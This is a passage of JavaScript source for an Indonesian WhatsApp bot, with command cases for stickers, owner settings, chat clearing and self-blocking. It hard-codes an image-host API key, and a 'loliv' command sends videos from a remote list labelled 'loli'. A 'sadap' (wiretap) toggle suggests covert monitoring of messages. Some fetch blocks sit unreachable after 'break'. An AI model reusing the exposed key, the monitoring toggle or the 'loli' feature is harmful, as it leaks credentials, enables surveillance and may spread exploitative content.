 reply(mess.wait)
 let nulis = encodeURIComponent(tul)
 let rest = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
 if (rest.data.error) return reply(rest.data.error)
 let bufft = Buffer.from(rest.data.result.split(',')[1], 'base64')
 surya.sendMessage(from, bufft, image, {quoted: msg, caption: mess.success}).catch(e => {
 return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
 limitAdd(sender, limit)
})
 break

case 'doge':
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
break
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
break
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
break
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
break
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
break
case 'patrick':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
//if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.Limits) 
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
limitAdd(sender, limit)
break
case 'gura':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
//if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.Limits)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
sendStickerUrl(from, pjr)
}
)
limitAdd(sender, limit)
break
case 'animes':
case 'stickeranime':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
//if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.Limits)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
.then(res => res.text())
.then(body => {
let todd = body.split("\n");
let pjrr = todd[Math.floor(Math.random() * todd.length)];
sendStickerUrl(from, pjrr)
}
)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
.then(res => res.text())
.then(body => {
let todd = body.split("\n");
let pjrr = todd[Math.floor(Math.random() * todd.length)];
sendStickerUrl(from, pjrr)
}
)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
.then(res => res.text())
.then(body => {
let todd = body.split("\n");
let pjrr = todd[Math.floor(Math.random() * todd.length)];
sendStickerUrl(from, pjrr)
}
)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
.then(res => res.text())
.then(body => {
let todd = body.split("\n");
let pjrr = todd[Math.floor(Math.random() * todd.length)];
sendStickerUrl(from, pjrr)
}
)
fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
.then(res => res.text())
.then(body => {
let todd = body.split("\n");
let pjrr = todd[Math.floor(Math.random() * todd.length)];
sendStickerUrl(from, pjrr)
}
)
limitAdd(sender, limit)
break

case 'ttp2':
if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
let warna = args[1].toString()
let txnya = q.slice(args[1].length + 1, q.length)
textImg('wait....')
let anjay = `http://zekais-api.herokuapp.com/text2png?text=${txnya}&color=${warna}`
sendStickerUrl(from, anjay)
break
case 'ttp':
if (args.length == 0) return reply(`Example: ${prefix + command} surya`)
 let buff1 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
surya.sendMessage(from, buff1, sticker, { quoted: msg })
break
case 'ttg':
let mek3 = encodeURIComponent(q)
if (args.length < 2) return 
let ane3 = await getBuffer(`https://api.lolhuman.xyz/api/attp?apikey=${lolkey}&text=${mek3}`)
fs.writeFileSync('./sticker/ttg.webp', ane3)
exec(`webpmux -set exif ./sticker/data.exif ./sticker/ttg.webp -o ./sticker/ttg.webp`, async (error) => {
if (error) return reply(mess.error.api)
surya.sendMessage(from, fs.readFileSync(`./sticker/ttg.webp`), sticker, {quoted: msg})
limitAdd(sender, limit)
fs.unlinkSync(`./sticker/ttg.webp`)
})

break
case 'loliv':
case 'lolivid':
case 'lolivideo':
reply(mess.wait)
let wipu1 = (await axios.get(`https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt`)).data
let wipi1 = wipu1[Math.floor(Math.random() * (wipu1.length))]
let anu5 = await getBuffer(wipi1)
surya.sendMessage(from, anu5, video, {quoted:msg})
break

case 'sgawgura':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
let get_result1 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${lolkey}`)
surya.sendMessage(from, get_result1, sticker, {quoted:msg})
let get_result2 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${lolkey}`)
surya.sendMessage(from, get_result2, sticker, {quoted:msg})
let get_result3 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${lolkey}`)
surya.sendMessage(from, get_result3, sticker, {quoted:msg})
let get_result4 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${lolkey}`)
surya.sendMessage(from, get_result4, sticker, {quoted:msg})
let get_result5 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${lolkey}`)
surya.sendMessage(from, get_result5, sticker, {quoted:msg})
let get_result6 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${lolkey}`)
surya.sendMessage(from, get_result6, sticker, {quoted:msg})
let get_result7 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${lolkey}`)
surya.sendMessage(from, get_result7, sticker, {quoted:msg})
let get_result8 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${lolkey}`)
surya.sendMessage(from, get_result8, sticker, {quoted:msg})
let get_result9 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${lolkey}`)
surya.sendMessage(from, get_result9, sticker, {quoted:msg})
let get_result10 = await getBuffer(`https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${lolkey}`)
surya.sendMessage(from, get_result10, sticker, {quoted:msg})
limitAdd(sender, limit)
break

case 'stickmeme': case 'smeme':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
if(!q) return reply(`Example : Reply sticker dengan Caption ${prefix + command} Surya`)
if (msg.message.extendedTextMessage != undefined || msg.message.extendedTextMessage != null) {
let ger = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
Flink(mess.wait)
let owgi = await surya.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
let anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", './stickmeme.jpeg')
let teks = `${anu.display_url}`
sendStickerUrl(from, `https://pecundang.herokuapp.com/api/memegen3?teks=${q}&img_url=${teks}`)
fs.unlinkSync('./stickmeme.jpeg')
}
limitAdd(sender, limit)
break

case 'setpp': case 'setppbot':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
if (isImage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let media = await surya.downloadMediaMessage(encmedia)
surya.updateProfilePicture(surya.user.jid, media)
textImg(`Makasih Surya profil barunya wangy sekali 😗`)
} else {
textImg(`Kirim gambar atau reply gambar dengan caption ${command}`)
}
break
case 'restart':
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
fakestatus(`_Restarting Mecha Botz_`)
exec(`node main`)
setTimeout( () => {
fakestatus(`_Mecha Botz Berhasil Di Restart_`)
}, 1000)
break
case 'setname':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length < 2) return textImg(`Kirim perintah ${command} nama

Contoh : ${command} suryaBot`)
surya.updateProfileName(q)
textImg(`Sukses mengganti nama bot`)
}
break
case 'setbio':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (args.length < 2) return textImg(`Kirim perintah ${command} nama

Contoh : ${command} suryaBot`)
surya.setStatus(q)
textImg(`Sukses mengganti info bot`)
}
break
case 'shutdown':
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
reply(`otsukaresama deshita ~👋🏻`)
.then(() => surya.close())
break

case 'sadap':
if (!isRegister) return //sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return //mentions(mess.OnlySurya, [Suryaa], true)
if (args[1] === 'on'){
sadap = true
reply(`Success`)
} else if (args[1] === 'off'){
sadap = false
reply(`Success`)
}
break

case 'mode':{ 
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
const buttons = [{buttonId: 'modepremium', buttonText: {displayText: 'Premium'}, type: 1},{buttonId: 'modegratisan', buttonText: {displayText: 'Gratisan'}, type: 1}]
const buttonsMessage = {
contentText: ` *〔 Button Bot Mode 〕*

${Ucapan} @${sender.split('@')[0]} Silahkan pilih salah satu dibawah`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break

case 'modepremium': case 'self':{ 
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
mode = 'SELF'
textImg(`*Berhasil Mengubah botz ke mode premium!*`)
}
break
case 'modegratisan': case 'publik': case 'public':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
mode = 'PUBLIC'
textImg(`*Berhasil Mengubah botz ke mode gratisan!*`)
}
break

case 'cekantidelete': case 'antideletecek':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
textImg(`ANTI DELETE : *${antidelete}*`)
break

case 'autoketik':{ 
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
const buttons = [{buttonId: 'autoketik1', buttonText: {displayText: 'On'}, type: 1},
{buttonId: 'autoketik0', buttonText: {displayText: 'Off'}, type: 1}]
const buttonsMessage = {
contentText: `*〔 Button Auto Ketik 〕*

${Ucapan} @${sender.split('@')[0]} Silahkan pilih salah satu dibawah 🌹`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}
surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'autovn':{ 
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
const buttons = [{buttonId: 'autovn1', buttonText: {displayText: 'On'}, type: 1},
{buttonId: 'autovn0', buttonText: {displayText: 'Off'}, type: 1}]
const buttonsMessage = {
contentText: `*〔 Button Auto VN 〕*

${Ucapan} @${sender.split('@')[0]} Silahkan pilih salah satu dibawah 🌹`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break
case 'autoread':{ 
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
const buttons = [{buttonId: 'autoread1', buttonText: {displayText: 'On'}, type: 1},
{buttonId: 'autoread0', buttonText: {displayText: 'Off'}, type: 1}]
const buttonsMessage = {
contentText: `*〔 Button Auto Read 〕*

${Ucapan} @${sender.split('@')[0]} Silahkan pilih salah satu dibawah 🌹`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break

case 'autoread1':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
autoread = true
reply(`Succes mengaktifkan Autoread`)
break
case 'autoread0':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
autoread = false
reply(`Succes mematikan Autoread`)
break

case 'autoketik1':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
autoketik = true
reply(`Succes mengaktifkan Autoketik`)
break
case 'autoketik0':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
autoketik = false
reply(`Succes mematikan Autoketik`)
break

case 'autovn1':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
autovn = true
reply(`Succes mengaktifkan Autovn`)
break
case 'autovn0':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
autovn = false
reply(`Succes mematikan Autovn`)
break

case 'simulasi':
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
textImg(mess.wait)
textImg(mess.success)
textImg(mess.error.lv)
textImg(mess.error.api)
textImg(mess.OnlyGrup)
textImg(mess.OnlyPM)
textImg(mess.GrupAdmin)
textImg(mess.BotAdmin)
mentions(mess.OnlySurya, [Suryaa], true)
mentions(mess.OnlyPrem, [sender], true)
break

case 'setmenu':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
let tmenu = moment(msg.messageTimestamp * 1000).format('HH:mm:ss')
const listMenu = {
buttonText: '𝐊𝐥𝐢𝐤 𝐃𝐢𝐬𝐢𝐧𝐢 ︎🌹',
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
description: `Hai kak @${sender.split('@')[0]}, ${Ucapan}\n\n${sholat}\n\nSilahkan Pilih Menu Disini 🌹`,
sections: [
{
"title": `${tmenu} - ${tampilBulan}`,
rows: [
{
"title": "Button",
"rowId": `${prefix}setmenubutton`
},
{
"title": "List",
"rowId": `${prefix}setmenulist`
},
{
"title": "Produk",
"rowId": `${prefix}setmenuproduk`
}
]
}],
listType: 1
}
surya.sendMessage(from, listMenu, MessageType.listMessage, {contextInfo: { mentionedJid: [sender, Suryaa, '0@s.whatsapp.net']}, quoted:fkontak})
break

case 'setmenuproduk':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (isMuted) return
if (isBan) return 
menusimpel = 'false'
menubutton = 'false'
menuproduk = 'true'
reply(mess.success)
break
case 'setmenulist':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (isMuted) return
if (isBan) return 
menusimpel = 'true'
menuproduk = 'false'
menubutton = 'false'
reply(mess.success)
break
case 'setmenubutton':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (isMuted) return
if (isBan) return 
menusimpel = 'false'
menubutton = 'true'
menuproduk = 'false'
reply(mess.success)
break

case 'antidelete':{ 
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
const buttons = [{buttonId: 'antidelete1', buttonText: {displayText: 'Enable'}, type: 1},{buttonId: 'antidelete0', buttonText: {displayText: 'Disable'}, type: 1}]
const buttonsMessage = {
contentText: `*〔 Button Anti Delete 〕*

${Ucapan} @${sender.split('@')[0]} Silahkan pilih salah satu dibawah 🌹`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {
contextInfo: {
mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}
break

case 'antidelete0':{ 
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
antidelete = 'NONAKTIF'
reply(`_*Berhasil Menonaktifkan Fitur Antidelete*_`)
}
break
case 'antidelete1':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
antidelete = 'AKTIF'
reply(`_*Berhasil Mengaktifkan Fitur Antidelete*_`)
}
break

case 'clearall':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
let chiit = await surya.chats.all()
for (let i of chiit){
surya.modifyChat(i.jid, 'delete', {
includeStarred: false
})
}
textImg(`*Selesai*`)
}
break

case 'clearfrom': case 'clearf':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
surya.modifyChat(from, 'delete', {includeStarred: false})
}
textImg(`*Selesai*`)
break
case 'clear':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
await sleep(3000)
surya.modifyChat(Suryaa, 'delete', {includeStarred: false})
}
textImg(`*Selesai*`)
break

case 'infoupdate':
let y = `sakit hati`
const infoupdate = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator Mecha Botz'}, type: 1}]
const infoupdateMessage = {
contentText: `
*MECHA BOTZ UPDATE*

*Berikut adalah updatean Mecha Botz VIP*
• Quran audio
• Wallpaper muslim
• Quotes muslim
• Culik
• Verify button + random password
• Teks maker no apikey
• Tutup time
• Buka time
• Sewa add/del
• List sewa
• Sewa cek
• Adventure
• Nsfw menu (penambah dosa)
• Reply baru
• Auto vn
• Auto ketik
• Fake youtube
• Button location
• Premium button
• Group description change
• Infos update
• Afk update
• Stiker emoji (Apple, Whatsapp, Twitter, Instagram, Facebook, Google, Microsoft, Mozilla, Samsung, Pixel, Htc)
• Dan lain lain`,
footerText: `
*> My Partner <*
• @${Suryaa.split('@')[0]}
• @${Farid.split('@')[0]}

*=> Spesial Thanks To <=*
• Allah SWT
• Alm. mama
• Pengguna mecha botz
• Member Anime Lovers
• Lolhuman
• Adek adeknyanya surya
• Bestienya surya
• Teman teman surya
• Dan WhatsApp

Untuk request fitur dan info selengkapnya silahkan hubungi creator saya dibawah ini
© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: infoupdate,
headerType: 1
}

surya.sendMessage(from, infoupdateMessage, MessageType.buttonsMessage, {contextInfo: {forwardingScore: 1000, isForwarded: true, mentionedJid: [Suryaa, Farid, '0@s.whatsapp.net']}, quoted: fkontak})
break

case 'blockme': case 'blokme':
if (fromMe) return textImg(`_Tidak bisa memblokir nomor sendiri!_`)
//if (isGroup) return textImg(`Perintah ini tidak bisa digunakan dalam digrup!`)
setTimeout( () => {
surya.sendMessage(sender, 'Perintah diterima\n\nMecha Botz akan memblokir kamu dalam...', text, {quoted: msg})
}, 100)
setTimeout( () => {
surya.sendMessage(sender, '5', text, {quoted: msg})
}, 2000)
setTimeout( () => {
surya.sendMessage(sender, '4', text, {quoted: msg})
}, 3000)
setTimeout( () => {
surya.sendMessage(sender, '3', text, {quoted: msg})
}, 4000)
setTimeout( () => {
surya.sendMessage(sender, '2', text, {quoted: msg})
}, 5000)
setTimeout( () => {
surya.sendMessage(sender, '1', text, {quoted: msg})
}, 6000)
setTimeout( () => {
surya.sendMessage(sender, `Bye bye👋🏻 ${pushname}`, text, {quoted: msg})
}, 7000)
await sleep(9000)
await surya.blockUser(sender, "add")
break

case 'tmp3': case 'toaudio':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isAudio || isQuotedAudio) {
let audiony = isQuotedAudio ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let mp3ny = await surya.downloadMediaMessage(audiony)
surya.sendMessage(from, mp3ny, audio, {quoted: msg})
}
break

case 'detikvn':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
